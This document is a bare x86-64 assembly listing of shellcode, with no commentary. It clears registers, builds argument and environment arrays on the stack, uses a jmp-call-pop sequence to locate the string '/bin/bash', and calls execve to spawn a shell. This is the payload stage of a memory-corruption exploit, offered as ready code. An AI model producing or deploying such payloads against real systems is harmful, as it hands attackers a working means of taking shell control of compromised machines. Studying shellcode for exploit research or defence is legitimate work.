bits64


part1:
    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    xor rdx,rdx
    push rdx
    mov rdx,rsp ; envp
    push rax
    jmp shellcodeString

part2:
    pop rdi
    push rax
    push rdi
    mov rsi,rsp
    mov al,59
    syscall

shellcodeString:
    call part2
    db "/bin/bash"